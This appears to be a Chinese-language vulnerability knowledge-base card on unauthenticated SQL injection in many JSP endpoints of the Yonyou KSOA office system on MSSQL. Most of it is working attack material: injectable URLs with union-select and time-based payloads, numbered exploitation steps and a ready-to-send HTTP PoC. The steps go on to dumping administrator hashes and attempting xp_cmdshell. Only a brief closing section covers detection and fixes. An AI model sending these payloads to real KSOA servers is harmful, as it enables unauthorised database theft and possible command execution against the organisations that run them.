---
id: web-java-component-yonyou-ksoa-unauth-jsp-sqli-multi-endpoint
title: 用友时空 KSOA 未授权 JSP SQL 注入：PreviewKPQT/PrintZP*/PrintZPYG/fillKP 等十余处参数直接拼接（MSSQL）
type: scenario
domain: web
path: web/java/component
technique: yonyou-ksoa-unauth-jsp-sqli
aliases:
- 用友 KSOA SQL 注入
- ksoa 未授权注入
- PreviewKPQT.jsp 注入
- PrintZP.jsp 注入
- PrintZPYG.jsp 注入
- fillKP.jsp 注入
- kp_djbh 注入
tags:
- yonyou
- ksoa
- sqli
- jsp
- unauthenticated
- mssql
- oa
- audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V296
  verified_at: '2026-11-08T07:57:02+08:00'
  notes: 已对照原文与6张图核对：7个未授权 JSP 注入端点及参数（PreviewKPQT.jsp 的 KPQTID/KPQType、PrintZP/PrintZPFB 的 zpfbbh、PrintZPYG 的 zpjhid、PrintZPZP 的 zpshqid、fillKP 的 kp_djbh）与原文 URL 逐条一致；MSSQL 的 db_name()/WAITFOR DELAY/sys.fn_varbintohexstr(hashbytes(...)) 与原文一致；图03 确认 PreviewKPQT.jsp 无 common.jsp include，图06 确认 ad_reader.jsp 的 id 直接拼接，图02 确认受保护 JSP include common.jsp 且同样拼接 SQL。未验证点：未实际请求目标，回显/时间盲注未复跑；原文未写 KSOA 版本，未设置 affected_versions；frontmatter 无 sources/source_url。dup-scan 与同文章 ImageUpload 卡为 related，两卡分别覆盖 SQLi 与上传，机制不同，均保留。
---

## 一句话结论

用友时空 KSOA（JSP+Servlet 老 OA）存在多处未授权 JSP 直接把请求参数拼进 SQL 的注入点：`PreviewKPQT.jsp` 的 `KPQTID`/`KPQType`、`PrintZP.jsp`/`PrintZPFB.jsp` 的 `zpfbbh`、`PrintZPYG.jsp` 的 `zpjhid`、`PrintZPZP.jsp` 的 `zpshqid`、`fillKP.jsp` 的 `kp_djbh` 等，均可无登录用联合查询/时间盲注读取数据库（原文为 MSSQL，使用 `db_name()`、`WAITFOR DELAY`、`sys.fn_varbintohexstr(hashbytes(...))`）。

## 原理

- KSOA 采用 JSP+Servlet 模式，很多业务 JSP 可直接访问并接收参数；鉴权靠每个 JSP 顶部 `<%@ include file="common.jsp"%>`（以及 session 判断）实现，凡是漏掉该 include 的 JSP 就是未授权入口。
- 这些 JSP 用 `ParamUtils.getString(request, "参数", "")` 取参后直接字符串拼接 SQL，再交给 `Database.executeQuery(SQL)`；没有预编译/参数化，`'` 即可闭合字符串。
- 原文给出的注入点（同一根因，端点/参数不同）：
  - `/kp/PreviewKPQT.jsp?KPQTID=1&KPQType=db_name(),2,3+--+`
  - `/PrintZP.jsp?zpfbbh=1' IF(LEN(db_name())>4) WAITFOR DELAY '0:0:2' --+`
  - `/PrintZPYG.jsp?zpjhid=1' union select 1,2,db_name(),4,5,6,7,8,9,10,11,12,13,14 --+`
  - `/PrintZPFB.jsp?zpfbbh=1' union select 1,2,3,4,db_name() --+`
  - `/PrintZPZP.jsp?zpshqid=1' union select 1,2,db_name(),4,5,6,7,8,9,10,11,12,13 --+`
  - `/fillKP.jsp?kp_djbh=1' IF(LEN(db_name())>4) WAITFOR DELAY '0:0:2' --+`
  - `/kp/PreviewKPQT.jsp?KPQType=KPQT&KPQTID=1' union select sys.fn_varbintohexstr(hashbytes('md5','test')),2,3 --+`
- MSSQL 的 `db_name()` 回显库名、`WAITFOR DELAY` 做时间盲注、`fn_varbintohexstr(hashbytes(...))` 计算并十六进制回显哈希，说明后端是 SQL Server；若应用连接账户权限高（常见 OA 用 sa/dbo），可进一步尝试 `xp_cmdshell`/堆叠查询。
- 这些端点大多属于打印/预览类功能（PrintZP*、PreviewKPQT、fillKP），参数直接来自 URL，攻击面大且不需要任何会话。

## 触发条件

- 目标为用友时空 KSOA（JSP+Servlet 老 OA），对应 JSP 存在且未做鉴权 include。
- 后端为 Microsoft SQL Server（原文 payload 使用 MSSQL 函数）。
- 攻击者可访问目标 80/443 或应用端口；不需要登录。
- 应用数据库账户有对应查询权限（联合查询/子查询/时间延迟所需）。

## 利用步骤

1. 确认目标为 KSOA（页面标题/静态资源路径/`com.sksoft` 包名等特征）。
2. 用 `PreviewKPQT.jsp?KPQTID=1&KPQType=db_name(),2,3+--+` 探测联合查询列数与库名回显。
3. 用 `PrintZP.jsp?zpfbbh=1' IF(LEN(db_name())>4) WAITFOR DELAY '0:0:2' --+` 做时间盲注验证（响应延迟约 2 秒）。
4. 用 `PrintZPYG.jsp?zpjhid=1' union select 1,2,db_name(),4,...,14 --+` 等确定各端点列数并回显任意查询结果。
5. 进一步读取 `sysobjects`/`information_schema` 表名、管理员哈希（`fn_varbintohexstr(hashbytes('md5',...))` 或直接查用户表），或尝试堆叠 `;exec xp_cmdshell ...`（视权限）。

## PoC

```http
GET /xxx/kp/PreviewKPQT.jsp?KPQTID=1&KPQType=db_name(),2,3+--+ HTTP/1.1

GET /xxx/PrintZP.jsp?zpfbbh=1%27+IF(LEN(db_name())%3E4)+WAITFOR+DELAY+%270:0:2%27+--+ HTTP/1.1

GET /xxx/PrintZPYG.jsp?zpjhid=1%27+union+select+1,2,db_name(),4,5,6,7,8,9,10,11,12,13,14+--+ HTTP/1.1

GET /xxx/PrintZPFB.jsp?zpfbbh=1%27+union+select+1,2,3,4,db_name()+--+ HTTP/1.1

GET /xxx/PrintZPZP.jsp?zpshqid=1%27+union+select+1,2,db_name(),4,5,6,7,8,9,10,11,12,13+--+ HTTP/1.1

GET /xxx/fillKP.jsp?kp_djbh=1%27+IF(LEN(db_name())%3E4)+WAITFOR%20DELAY%20%270:0:2%27+--+ HTTP/1.1

GET /xxx/kp/PreviewKPQT.jsp?KPQType=KPQT&KPQTID=1%27+union+select+sys.fn_varbintohexstr(hashbytes(%27md5%27,%27test%27)),2,3+--+ HTTP/1.1
```

## 变体与关联

- 变体：`ad_reader.jsp` 等未授权文件中 `select * from bbs_bbslink where id='" + id + "'"` 的 `id` 参数同样可直接注入。
- 变体：除 SQLi 外，未授权 JSP 还可能存在文件上传/下载/任意文件读取；用同一套 include/session 筛选法可批量发现。
- 关联：[[code-analysis-source-audit-jsp-legacy-oa-include-auth-filter]] 是本卡所用的审计方法。
- 关联：[[web-java-component-yonyou-ksoa-imageupload-arbitrary-file-upload]] 是同一产品的未授权文件上传入口。

## 检测与防御

- 检测：`PreviewKPQT.jsp`/`PrintZP*.jsp`/`fillKP.jsp` 等 URL 参数出现引号、`UNION`、`WAITFOR`、`db_name`、`fn_varbintohexstr` 等特征；响应时间异常（时间盲注）；WAF/数据库审计出现拼接 SQL。
- 防御：所有 SQL 改预编译/参数化查询；对 JSP 做统一鉴权过滤器（不要依赖每个页面 `include`）；升级厂商补丁；数据库账户最小权限、禁用 `xp_cmdshell`；WAF 规则拦截 SQL 关键字仅作缓解。
